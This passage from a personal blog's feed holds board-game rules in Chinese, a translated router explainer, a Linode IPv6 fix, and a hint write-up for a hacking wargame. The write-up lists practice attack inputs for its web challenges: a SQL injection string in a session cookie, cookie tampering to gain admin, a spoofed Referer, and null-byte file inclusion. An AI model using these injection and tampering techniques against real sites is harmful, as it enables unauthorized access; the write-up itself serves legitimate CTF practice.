<li><code>同房间内</code>的<code>两张</code>低(高)等级线索卡合成为一张高(低)等级线索卡</li>
<li>如成功发起，则参与合成的两名玩家，进入<code>行动</code>步骤</li>
<li><code>1 + 1 = 2</code>, <code>1 + 2 = 3</code>, 其他不可升级</li>
<li><code>3 - 1 = 2</code>, <code>3 - 2 = 1</code>, <code>2 - 1 = 1</code>, 其他不可降级</li>
<li>如存在多名可与之合成的玩家，则先<code>询问</code>与谁合成</li>
<li>合成后的线索卡归<code>房间功能执行者</code>所有，原线索卡<code>消失</code></li>
<li>合成后获得线索卡的玩家自动获得线索区标记</li>
<li>合成失败，线索卡各自保留</li>
</ul>
</li>
<li><code>拆弹</code>房间：<code>两个拆弹房间</code>合力进行拆弹

<ul>
<li>两个拆弹房间<code>各至少1人</code>，才可发起拆弹</li>
<li>两个拆弹房间<code>总人数</code>大于等于以下标准，才可发起拆弹</li>
<li>5人局 第一次2人，第二次2人</li>
<li>6人局 第一次2人，第二次3人</li>
<li>7人局 第一次2人，第二次3人</li>
<li>8人局 第一次3人，第二次3人</li>
<li>9人局 第一次3人，第二次4人</li>
<li>如成功发起，则两个拆弹房间内的<code>所有玩家</code>，进入<code>行动</code>步骤</li>
<li><code>受害者</code>及<code>EX受害者</code>只能<code>配合</code>，<code>奸徒</code>和<code>SP暗警</code>可以<code>破坏</code></li>
<li>至多可以拆弹两次，若两次均成功，或暗警伏击成功，游戏<code>增加一回合</code></li>
<li>如拆弹失败，控制器被<code>永久破坏</code>，不可再次拆弹</li>
</ul>
</li>
</ul>


<h4>思考阶段</h4>

<ul>
<li>思考<code>15秒</code>，规划下一阶段的发言/行动</li>
<li>此时会提示<code>剩余线索卡</code>张数、下一轮拆弹(如果可以)所需人数</li>
<li>15秒过后，回到发言阶段继续<code>下一轮</code></li>
</ul>


<h3>mini模式</h3>

<ul>
<li><code>3-4人</code>游戏时自动开启<code>mini模式</code></li>
<li>去掉<code>1、5、8、12号</code>房间</li>
<li>去掉<code>拆弹</code>房间、<code>降级</code>房间</li>
<li>去掉<code>钥匙</code>及<code>锁</code>功能</li>
<li>去掉<code>3级线索卡</code></li>
<li>去掉<code>EX受害者</code>、<code>SP暗警</code></li>
<li>回合数固定为<code>8</code></li>
<li>受害者胜利条件变为<code>逃生人数 &gt;= 受害者总人数 - 1</code></li>
</ul>


<h3>注意事项</h3>

<ul>
<li>线索区为<code>个人线索区</code></li>
<li>自己的线索区<code>只能自己看到</code>，并不与其他玩家共享</li>
<li>获得线索卡，或者查看到别人的线索卡，则自动进行标记，可以点击进行修改</li>
<li>别人在发言阶段报出线索卡内容，可以<code>自行点击线索区</code>标记</li>
<li>发言阶段输入<code>/xs</code>，可以自动输出自己的线索区标记状态至发言区</li>
<li>游戏断线后会<code>自动重连</code>，请不要关闭或者刷新游戏页面，否则游戏将直接结束。</li>
<li>如发现bug，请在官方QQ群(<a href="http://shang.qq.com/wpa/qunwpa?idkey=5c2b3d7e0616c2711001a6e8ab9661d9b0d6ae321169afb09e4fa0b38911e7ce">205189960</a>)进行反馈，同时提供以下信息</li>
<li>操作系统版本</li>
<li>浏览器版本</li>
<li>完整的游戏记录(从聊天区复制出来即可)</li>
</ul>


<h2>版权声明</h2>

<ul>
<li>《密室惊魂Online》</li>
<li>设计&amp;开发：<strong><a href="http://xelz.info">xelz</a></strong></li>
<li>监制：KbueCat</li>
<li>Online版本在获得官方许可下制作，但不作为官方版本发布、发售</li>
<li>代码开源(<a href="https://github.com/xelzmm/damned">github</a>)，遵循<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" alt="CC(BY-NC-SA)" /></a>协议，禁止用于商业用途</li>
<li>《密室惊魂》</li>
<li>设计总监：KbueCat</li>
<li>游戏版权归<strong>创游文化</strong>所有，包括但不限于制作Online版本使用到的游戏创意、规则、素材等</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[什么是路由器(译)？]]></title>
    <link href="http://xelz.info/blog/2014/12/17/what-is-a-router/"/>
    <updated>2014-12-17T11:36:53+08:00</updated>
    <id>http://xelz.info/blog/2014/12/17/what-is-a-router</id>
    <content type="html"><![CDATA[<p>Origin：<a href="http://www.inetdaemon.com/tutorials/internet/ip/routing/define_router.shtml">http://www.inetdaemon.com/tutorials/internet/ip/routing/define_router.shtml</a></p>

<p>路由器(包括无线路由器)，是一种连接两个以上不同的网络、具备网络间数据包转发功能的专用网络设备。它基于IP协议，工作在网络层(OSI七层模型的第3层)。路由器的主要功能是将不同的网络连接起来，让它们相互间能够进行数据交换，并将局域网内不必要的广播流量精确地发送到目标主机。有很多制造路由器的厂商，简单列举一些：Cisco(思科)，Linksys，Juniper，Netgear(网件)，Nortel (北电)，Redback，Lucent(朗讯)，3Com，HP(惠普)，Dlink，Belkin(贝尔金)等。</p>

<p>有一些网络技能认证考试(如CCNA，CCNP，JNCIA，JNCIE)会考你区分网络设备的能力。这篇关于路由器的文章主要会解释如何辨别路由器，路由器有哪些功能(当然不包含某些厂商特有的技术)。</p>

<!-- more-->


<h3>路由器如何工作？</h3>

<p>我们用普通家用无线宽带路由器举一个非常简单的例子</p>

<ol>
<li>接通电源并开机，从闪存中加载操作系统启动</li>
<li>载入NVRAM中的配置，启动所有的网络接口并设置好路由协议</li>
<li>在路由表中为每个网络接口添加地址和子网掩码</li>
<li>家用路由器中有一条简单的静态路由：所有非本地流量全部路由到WAN口</li>
<li>每当路由器收到一个网页的访问请求，都会在路由表中检索要访问的目标IP地址</li>
<li>数据包中的目的地址就是路由表中的索引，根据索引找到对应的路由，这条路由会表明这个请求需要从哪个网络接口转发出去</li>
<li>把数据包通过正确的网络接口发给下一跳路由，下一跳路由重复同样的路由转发操作直到数据包到达目的主机。</li>
</ol>


<p>这个过程对于<em>大部分</em>路由器都适用。</p>

<p>PS: 稍微解释下，家用宽带路由器以及无线路由器同样肩负着“代理”的任务，它们会把IP数据包中的源IP改成路由器自己的IP，这一点跟运营商级别的路由器是不同的。</p>

<h3>我为什么需要路由器？</h3>

<p>路由器可以把不同的网络连接起来，并且实现以下功能，希望你看过之后能在网络认证考试中正确地描述路由器：</p>

<h5>路由器的功能</h5>

<ol>
<li>限制局域网的广播流量</li>
<li>作为默认网关</li>
<li>进行协议转换(比如从有线的以太网到无线网络，或者以太网到有线电视)</li>
<li>在不同网络间路由数据包</li>
<li>学习并公布路由路径</li>
<li>计算到每一个网络的最佳路由途径</li>
</ol>


<h3>限制局域网的广播流量</h3>

<p>网络(尤其是以太网)在物理层、数据链路层和网络层是通过广播方式进行通信的。网络层的广播是指通过网络层协议(一般是IP或者IPX协议)将数据流量发送到网络上所有的主机。网络广播是用来传输特定的数据包(如ARP, RARP, DHCP, IPX-SAP等)从而使网络能够正常运转。因为有部分网络设备会尝试同时传输数据因而产生冲突，所以最好能通过交换机或者路由器把一个超大集群划分成不同的广播域。</p>

<p>随着网络中主机数量的不断增长，广播数量也会随之增多。如果网络上涌现了足够多的广播流量，网络上的正常通信将会变得非常困难。</p>

<p>为了减少广播的数量，网络管理员可以将一个包含大量主机的网络集群划分成两个小的网络。广播流量将被限制在各自的网络内部，而此时路由器则承担了连接互通两个网络的『默认网关』的作用。</p>

<h3>作为默认网关</h3>

<p>现如今的网络环境下，人们需要将电脑接入互联网。当你的电脑想跟另一个网络下的某一台电脑通信时，你的数据就会被发送给你的默认网关。默认网关是一台连接了和你的电脑同样网络的路由器。这台路由器作为默认网关，接收你的数据，寻找远端主机的地址并作出路由选择。根据路由的选择，默认网关会把你的数据转发给理远端主机更近的另一个网络设备。这中间可能会经过很多路由器，所以会有很多路由器参与处理你的数据包，就像消防队员救火时的水桶接力。</p>

<h3>在不同网络间路由数据包</h3>

<p>路由器具有将数据包从一个网络传送到另一个网络的能力。这使两个不同组织管理的不同网络之间的数据交换成为可能。他们可以在路由器之间创建一个中间网络并在这个网络上交换数据。因为路由器可以从任意接入的网络接收数据，并将其转发到其他网络，因此它也可以让不能正常通信的两个网络交换数据。技术角度来说，有了路由器，一个令牌环网络可以通过一个串行网络跟一个以太网进行通信。</p>

<h3>学习并公布路由路径</h3>

<p>路由器只有在使用诸如RIP,OSPF,EIGRP,IS-IS或者BGP等路由协议时，才会动态地学习路由并公布。否则路由器只能被手动设定，这种路由方式也被称作静态路由。</p>

<p>路由器是『逐跳』传送数据的，就像『烫手的山芋』一跳接一跳。如果经过一系列路由器，数据还是没有到达目标主机，而是转了一圈回到某一跳路由节点，这杯称作路由环路。数据包在路由环路中一直传递直到生命周期结束：到达TTL上限。TTL是IP数据报文头部中的一个计数器。TTL的值会随着数据包在每一跳路由传递而递减，最终如果变成0就会被丢弃。</p>

<h3>路由器的组成部分</h3>

<p>路由器其实是特殊的计算机，因此和其他计算器有着相同的组成：</p>

<ul>
<li>中央处理器(CPU)</li>
<li>闪存</li>
<li>非易失性内存</li>
<li>内存</li>
<li>网络接口(网卡)</li>
<li>控制台</li>
</ul>


<p><strong>中央处理器</strong>：运行路由器操作系统，例如Juniper路由器运行着JunOS，Cisco路由器运行着Cisco IOS(Nexus OS)。操作系统管理者路由器的各个组件，并提供路由器运行所必须的功能逻辑。</p>

<p><strong>闪存</strong>：存储着操作系统，类似你电脑里的硬盘。如果你的电脑使用了SSD，那么它就用了闪存。(译注：SSD是闪存组成的)</p>

<p><strong>非易失性内存</strong>：这是一块额外的空间，用来存储系统的备份或者原始操作系统。路由器会从这里开始引导，并加载所有的程序。</p>

<p><strong>内存</strong>：当路由器启动时，操作系统已经被加载进了内存。一旦路由器完成了启动，就开始计算自身的路由，如果配置了RIP(v1及v2)，OSPF, EIGRP, IS-IS或者BGP等路由协议，也会从其他路由器学习路由。内存也用于缓存ARP表，路由表，路由距离以及其他可以加快路由转发的数据。</p>

<p><strong>网络接口</strong>：路由器总是拥有许多网络接口(网卡)。操作系统中包含了可以控制这些网络接口的驱动程序。路由器会在启动的时候获知每个接口配置了什么样的网络。之后它们会从自身连接的其他路由器那里学习路由，并学习将数据包传送到某个远端网络需要通过哪个接口。</p>

<p><strong>控制台</strong>：最后，很重要的一点，就是控制台。在以往的时间里，管理和配置路由器都是在每个设备上的控制台里进行，比如问题排查和错误诊断。网络认证考试中会包含非常多关于配置和排查问题的控制台命令。然而路由器的生产厂商正在迅速地淘汰设备上的独立控制台，转而建立中心化的管理系统用以管理大量的网络设备。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Solution for Google banning Linodes]]></title>
    <link href="http://xelz.info/blog/2014/07/28/resolve-google-ban-linode/"/>
    <updated>2014-07-28T18:00:00+00:00</updated>
    <id>http://xelz.info/blog/2014/07/28/resolve-google-ban-linode</id>
    <content type="html"><![CDATA[<h3>Google banned Linodes</h3>

<p>I usually use linode to visit Google services via ssh tunnel. but recently I always got captchas even <code>Sorry...</code> page.</p>

<p>Finally I knows that google banned ipv6 traffics from linode which they treated as robots.</p>

<h3>Solution</h3>

<p>disable ipv6 of linode</p>

<h4>for Ubuntu</h4>

<p>append lines below to <code>/etc/sysctl.conf</code></p>

<ul>
<li><p>net.ipv6.conf.all.disable_ipv6=1</p></li>
<li><p>net.ipv6.conf.default.disable_ipv6=1</p></li>
<li><p>net.ipv6.conf.lo.disable_ipv6=1</p></li>
</ul>


<p>then restart network <code>/etc/init.d/networking restart</code> or <code>reboot</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[New to Jekyll!]]></title>
    <link href="http://xelz.info/blog/2014/07/25/new-to-jekyll/"/>
    <updated>2014-07-25T17:58:57+00:00</updated>
    <id>http://xelz.info/blog/2014/07/25/new-to-jekyll</id>
    <content type="html"><![CDATA[<p>Hello Jekyll.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Write Up of a Very Interesting Wargame]]></title>
    <link href="http://xelz.info/blog/2014/06/09/write-up-of-a-very-interesting-wargame/"/>
    <updated>2014-06-09T18:00:00+00:00</updated>
    <id>http://xelz.info/blog/2014/06/09/write-up-of-a-very-interesting-wargame</id>
    <content type="html"><![CDATA[<p>Recently I&rsquo;m playing a wargame named [shhhh&hellip; edited].</p>

<p>I&rsquo;ve hidden the game name so that challengers could not find here by some searching work.</p>

<p>If you guys are about to cheat by this, get lost now.</p>

<p>You can find the game at [url]<code>c-a-n-y-o-u-h-a-c-k.i-t</code>(replace the dash with nothing)</p>

<p>Try to figure out by yourself, if you are really really really stucked, have a sight for some hints.</p>

<!-- more -->


<h2>Logic</h2>

<h4>Logic 1</h4>

<p>password is just <code>password</code></p>

<h4>Logic 2</h4>

<p>It&rsquo;s a kind of pun. If you cannot guess the riddle, just answer <code>no</code>.</p>

<p>Acturually the answer is Nitric Oxide, as known as <code>NO</code></p>

<h4>Logic 3</h4>

<p>Inspect the source code, you will find the password in comment.</p>

<h4>Logic 4</h4>

<p><strong>Fibonacci Prime</strong></p>

<p>prime(n) = 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271 &hellip;</p>

<p>fibonacci(n) = 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144 &hellip;</p>

<ul>
<li>prime(fibonacci(1)) = prime(1) = 2</li>
<li>prime(fibonacci(2)) = prime(2) = 3</li>
<li>prime(fibonacci(3)) = prime(3) = 5</li>
<li>prime(fibonacci(4)) = prime(5) = 11</li>
<li>&hellip;</li>
<li>prime(fibonacci(8)) = prime(55) = 139</li>
<li>prime(fibonacci(9)) = prime(55) = 257</li>
</ul>


<h2>Script</h2>

<h4>Script 1</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#password&#39;</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;javascript&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>password is <code>javascript</code></p>

<h4>Script 2</h4>

<p>Run this code in javasript console, then check the value of variable <code>password</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="s2">&quot;de9f8caa7ea6fe56830925a124d605d4&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">password</span> <span class="o">+=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">substring</span><span class="p">((</span><span class="nx">i</span><span class="o">%</span><span class="mi">3</span><span class="p">),(</span><span class="nx">i</span><span class="o">%</span><span class="mi">5</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">i</span><span class="o">%</span><span class="mi">3</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Script 3</h4>

<p>Run this code in javasript console, then check the value of variable <code>password</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">keys</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span> <span class="s2">&quot;3&quot;</span><span class="p">,</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span> <span class="s2">&quot;5&quot;</span><span class="p">,</span> <span class="s2">&quot;6&quot;</span><span class="p">,</span> <span class="s2">&quot;7&quot;</span><span class="p">,</span> <span class="s2">&quot;8&quot;</span><span class="p">,</span> <span class="s2">&quot;9&quot;</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">,</span> <span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="s2">&quot;C&quot;</span><span class="p">,</span> <span class="s2">&quot;D&quot;</span><span class="p">,</span> <span class="s2">&quot;E&quot;</span><span class="p">,</span> <span class="s2">&quot;F&quot;</span><span class="p">,</span> <span class="s2">&quot;G&quot;</span><span class="p">,</span> <span class="s2">&quot;H&quot;</span><span class="p">,</span> <span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="s2">&quot;J&quot;</span><span class="p">,</span> <span class="s2">&quot;K&quot;</span><span class="p">,</span> <span class="s2">&quot;L&quot;</span><span class="p">,</span> <span class="s2">&quot;M&quot;</span><span class="p">,</span> <span class="s2">&quot;N&quot;</span><span class="p">,</span> <span class="s2">&quot;O&quot;</span><span class="p">,</span> <span class="s2">&quot;P&quot;</span><span class="p">,</span> <span class="s2">&quot;Q&quot;</span><span class="p">,</span> <span class="s2">&quot;R&quot;</span><span class="p">,</span> <span class="s2">&quot;S&quot;</span><span class="p">,</span> <span class="s2">&quot;T&quot;</span><span class="p">,</span> <span class="s2">&quot;U&quot;</span><span class="p">,</span> <span class="s2">&quot;V&quot;</span><span class="p">,</span> <span class="s2">&quot;W&quot;</span><span class="p">,</span> <span class="s2">&quot;X&quot;</span><span class="p">,</span> <span class="s2">&quot;Y&quot;</span><span class="p">,</span> <span class="s2">&quot;Z&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">,</span> <span class="s2">&quot;c&quot;</span><span class="p">,</span> <span class="s2">&quot;d&quot;</span><span class="p">,</span> <span class="s2">&quot;e&quot;</span><span class="p">,</span> <span class="s2">&quot;f&quot;</span><span class="p">,</span> <span class="s2">&quot;g&quot;</span><span class="p">,</span> <span class="s2">&quot;h&quot;</span><span class="p">,</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="s2">&quot;j&quot;</span><span class="p">,</span> <span class="s2">&quot;k&quot;</span><span class="p">,</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="s2">&quot;m&quot;</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span><span class="p">,</span> <span class="s2">&quot;o&quot;</span><span class="p">,</span> <span class="s2">&quot;p&quot;</span><span class="p">,</span> <span class="s2">&quot;q&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span><span class="p">,</span> <span class="s2">&quot;t&quot;</span><span class="p">,</span> <span class="s2">&quot;u&quot;</span><span class="p">,</span> <span class="s2">&quot;v&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;y&quot;</span><span class="p">,</span> <span class="s2">&quot;z&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">k</span> <span class="o">=</span> <span class="s2">&quot;17 4 59 0 53 28&quot;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="k">in</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">password</span> <span class="o">+=</span> <span class="nx">keys</span><span class="p">[</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">k</span><span class="p">[</span><span class="nx">i</span><span class="p">])];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<h2>Cryptography</h2>

<h4>Cryptography 1</h4>

<p>The <strong>Salad Cipher</strong>, aka <strong>ROT13</strong></p>

<p>Decryption Key</p>

<pre><code>A|B|C|D|E|F|G|H|I|J|K|L|M
-------------------------
N|O|P|Q|R|S|T|U|V|W|X|Y|Z
</code></pre>

<p>letter above equals below, and vice versa</p>

<h4>Cryptography 2</h4>

<p>Try to combine some words using the numbers with T9 IME on a mobile phone.</p>

<table style="text-align: center;">
<tr><td><p>1</p>&#8217;</td><td><p>2</p>ABC</td><td><p>3</p>DEF</td></tr>
<tr><td><p>4</p>GHI</td><td><p>5</p>JKL</td><td><p>6</p>MNO</td></tr>
<tr><td><p>7</p>PQRS</td><td><p>8</p>TUV</td><td><p>9</p>WXYZ</td></tr>
</table>


<h4>Cryptography 3</h4>

<p><strong>Base64</strong> decode it.</p>

<h4>Cryptography 4</h4>

<p><strong>Caesar&rsquo;s Square</strong></p>

<pre><code>TSDLN ILHSY OGSRE WOOFR OPOUK OAAAR RIRID
</code></pre>

<p>Count the number of letters, here we have 35
We can put 35 into 5 rows of 7</p>

<pre><code>TSDLNIL
HSYOGSR
EWOOFRO
POUKOAA
ARRIRID
</code></pre>

<p>Read it, downwards from the top left, then the next column.</p>

<h4>Cryptography 6</h4>

<p><strong>Morse Alphabet</strong></p>

<h4>Cryptography 7</h4>

<p><strong>ASCII</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#python</span>
</span><span class='line'><span class="n">text</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s">&#39;84 104 101 32 115 101 99 114 101 116 32 119 111 114 100 32 121 111 117 39 114 101 32 115 101 97 114 99 104 105 110 103 32 102 111 114 32 105 115 32 115 101 99 114 101 116&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)])</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<h4>Cryptography 8</h4>

<p><strong>Atbash</strong> (similar with the Salad Cipher)</p>

<pre><code>A|B|C|D|E|F|G|H|I|J|K|L|M
-------------------------
Z|Y|X|W|V|U|T|S|R|Q|P|O|N
</code></pre>

<p>letter above equals below, and vice versa</p>

<p>in another way</p>

<pre><code>Plain:  ABCDEFGHIJKLMNOPQRSTUVWXYZ
Cipher: ZYXWVUTSRQPONMLKJIHGFEDCBA
</code></pre>

<h4>Cryptography 9</h4>

<p><strong>Polybius Square</strong></p>

<table>
<thead>
    <tr><td>\</td><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr>
</thead>
<tbody>
    <tr><th>1</th><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td></tr>
    <tr><th>2</th><td>F</td><td>G</td><td>H</td><td>I</td><td>K</td></tr>
    <tr><th>3</th><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td></tr>
    <tr><th>4</th><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td></tr>
    <tr><th>5</th><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr>
</tbody>
</table>


<p>Each letter is then represented by its coordinates in the grid. For example, <code>BAT</code> becomes <code>12 11 44</code>. Because 26 characters do not quite fit in a square, it is rounded down to the next lowest square number by combining two letters (usually I and J).</p>

<h4>Cryptography 11</h4>

<p>The index of a letter in the <code>alphabt</code>. 0 indicates a blank.</p>

<h4>Cryptography 13</h4>

<p>A programming language named <strong>BrainFuck</strong>.</p>

<h4>Cryptography 16</h4>

<p>Read it in a human readable way. Starting with the top left <code>T</code>, then <code>H</code> under it, and then <code>E</code> on the right side. Hints in the title <code>clues</code>.</p>

<h4>Cryptography 17</h4>

<p><strong>MD5</strong> ，brute force it with the hint <code>a-z*6</code>, or try cmd5.org.</p>

<h4>Cryptography 22</h4>

<p>Static crypto table with a reverse. the crypto table can be easily dumped.</p>

<pre><code>e7 a4 90 71 36 49 aa e6 5b 3a ef 64 a0 be eb 09 f2 8c 57 ec 8f 74 1f 01 51 98 
Z  Y  X  W  V  U  T  S  R  Q  P  O  N  M  L  K  J  I  H  G  F  E  D  C  B  A

91 72 61 3f 69 fe 4b fa 85 fd 14 68 73 26 0f ac cc a1 4d db ab 43 46 11 08 b7
z  y  x  w  v  u  t  s  r  q  p  o  n  m  l  k  j  i  h  g  f  e  d  c  b  a

d8 b0 31 07 cf 8e 45 24 0b 5a
0  9  8  7  6  5  4  3  2  1

92 35 00 c6 3d 55 96 54 7d f6 e9
)  (  *  &amp;  ^  %  $  #  @  !   

cb d9 21 3e af 38 8b 4e 9e ea 0a 4c 04 58 6d b6 67 29 13 c5
?  &gt;  &lt;  "  :  |  }  {  +  _  /  .  ,  '  ;  \  ]  [  =  -
</code></pre>

<h4>Cryptography 25</h4>

<p><strong>Braille Alphabet</strong></p>

<h2>WEB Based</h2>

<h4>Web 1</h4>

<pre><code>Page=Admin
</code></pre>

<h4>Web 2</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">// javascript</span>
</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">&#39;isAdmin=1&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Web 3</h4>

<pre><code>/robots.txt
</code></pre>

<h4>Web 4</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl -H <span class="s1">&#39;Referer: www.google.com&#39;</span> <span class="s1">&#39;http://theurl/Content/Challenges/Web/Web4.php&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Web 5</h4>

<p>Do not waste time on the form because nothing happend when you click the button.</p>

<pre><code>SESSION=abf3e2d32ec32' or '1'='1' --
</code></pre>

<h4>Web 6</h4>

<p>look around <a href="http://theurl/Content/Challenges/Web/Files6/">http://theurl/Content/Challenges/Web/Files6/</a></p>

<h4>Web 7</h4>

<pre><code>curl -d 'Type=admin' 'http://theurl/Content/Challenges/Web/Web7.php'
</code></pre>

<h4>Web 8</h4>

<pre><code>Page[]=Home 
</code></pre>

<p>will trigger a php <code>fatal error</code>, which will display the error stack including the full path of the file in the page.</p>

<h4>Web 9</h4>

<pre><code>File=Files9/passconfigs.php%00
</code></pre>

<h4>Web 10</h4>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>curl <span class="s1">&#39;http://theurl/Content/Challenges/Web/Web10.php&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<h2>Microhard</h2>

<h4>CCTV</h4>

<p>Try to find something in the terminal</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">help</span>
</span><span class='line'><span class="nb">echo </span>learninglog.txt
</span><span class='line'>apt-get install ***
</span><span class='line'>ifconfig
</span><span class='line'>*** 192.***
</span></code></pre></td></tr></table></div></figure>


<p>Then an open port of a alive host which may be the remote camera.
Open it in Firefox and then successfully we can get the CCTV admin page.</p>

<p>Try to login with someone&rsquo;s name as the password.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[For Our One Year Anniversary]]></title>
    <link href="http://xelz.info/blog/2014/04/20/for-our-one-year-anniversary/"/>
    <updated>2014-04-20T20:00:00+00:00</updated>
    <id>http://xelz.info/blog/2014/04/20/for-our-one-year-anniversary</id>
    <content type="html"><![CDATA[<p>I make this page to remember our love.</p>

<p>GitHub: <a href="https://github.com/xelzmm/Love">https://github.com/xelzmm/Love</a></p>

<p>View: <a href="http://iloveyamei.aliapp.com">http://iloveyamei.aliapp.com</a> | <a href="http://love.xelz.info">http://love.xelz.info</a></p>

<p><img src="http://xelz.info/assets/2014/one-year.jpg" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DefCon CTF Qualifier 2013 3dub 3 Write Up]]></title>
    <link href="http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up/"/>
    <updated>2013-06-28T12:00:00+00:00</updated>
    <id>http://xelz.info/blog/2013/06/28/defcon-ctf-qualifier-2013-3dub-3-write-up</id>
